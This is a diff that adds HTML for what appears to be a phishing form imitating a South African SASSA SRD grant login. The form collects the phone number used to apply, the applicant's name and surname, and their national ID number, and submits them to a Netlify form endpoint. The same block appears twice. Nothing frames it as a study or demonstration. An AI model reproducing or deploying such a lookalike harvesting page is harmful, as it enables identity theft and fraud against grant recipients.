@@ -1,0 +1,49 @@
+<div class="entry-content" id="post-body-395428029364382839" style="line-height: 1.6em; margin: 1.5em 0px 2em;">
+    <form data-netlify="true" method="POST" name="sassaForm" netlify-honeypot="bot-field">
+        <div class="login-container" style="border-radius: 6px; border: 1px solid yellow; margin: 30px auto; max-width: 280px; padding: 17px;">
+            <div class="image-container">
+                <div class="separator" style="clear: both; text-align: center;">
+                    <b style="color: red; font-size: 15px;"><div class="separator" style="clear: both; text-align: center;"><br /></div>SASSA 370 SRD GRANT</b>
+                </div>
+            </div>
+            <div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;">
+                <label style="color: black; font-weight: bold;">(+27) Enter your numbers used to apply:</label>
+                <input id="username" name="username" required="" style="border-color: yellow; border-radius: 8px; border: 1px solid; padding: 8px; width: 100%;" type="text" />
+            </div>
+            <div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;">
+                <label style="color: black; font-weight: bold;">Enter your Name &amp; Surname:</label>
+                <input id="name" name="name" required="" style="border-color: yellow; border-radius: 8px; border: 1px solid; padding: 8px; width: 100%;" type="text" />
+            </div>
+            <div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;">
+                <label style="color: black; font-weight: bold;">Enter your ID number:</label>
+                <input id="idno" name="idno" required="" style="border-color: yellow; border-radius: 8px; border: 1px solid; padding: 8px; width: 100%;" type="text" />
+            </div>
+            <button class="login-button" style="background-color: blue; border-radius: 3px; border: none; color: white; cursor: pointer; font-weight: bold; padding: 6px 115px;" type="submit">LOGIN</button>
+        </div>
+        <input name="form-name" type="hidden" value="sassaForm" />
+    </form>
+</div><div class="entry-content" id="post-body-395428029364382839" style="line-height: 1.6em; margin: 1.5em 0px 2em;">
+    <form data-netlify="true" method="POST" name="sassaForm" netlify-honeypot="bot-field">
+        <div class="login-container" style="border-radius: 6px; border: 1px solid yellow; margin: 30px auto; max-width: 280px; padding: 17px;">
+            <div class="image-container">
+                <div class="separator" style="clear: both; text-align: center;">
+                    <b style="color: red; font-size: 15px;"><div class="separator" style="clear: both; text-align: center;"><br /></div>SASSA 370 SRD GRANT</b>
+                </div>
+            </div>
+            <div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;">
+                <label style="color: black; font-weight: bold;">(+27) Enter your numbers used to apply:</label>
+                <input id="username" name="username" required="" style="border-color: yellow; border-radius: 8px; border: 1px solid; padding: 8px; width: 100%;" type="text" />
+            </div>
+            <div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;">
+                <label style="color: black; font-weight: bold;">Enter your Name &amp; Surname:</label>
+                <input id="name" name="name" required="" style="border-color: yellow; border-radius: 8px; border: 1px solid; padding: 8px; width: 100%;" type="text" />
+            </div>
+            <div class="form-group" style="color: #757575; font-family: Roboto, sans-serif; font-size: 15px; margin-bottom: 15px;">
+                <label style="color: black; font-weight: bold;">Enter your ID number:</label>
+                <input id="idno" name="idno" required="" style="border-color: yellow; border-radius: 8px; border: 1px solid; padding: 8px; width: 100%;" type="text" />
+            </div>
+            <button class="login-button" style="background-color: blue; border-radius: 3px; border: none; color: white; cursor: pointer; font-weight: bold; padding: 6px 115px;" type="submit">LOGIN</button>
+        </div>
+        <input name="form-name" type="hidden" value="sassaForm" />
+    </form>
+</div>
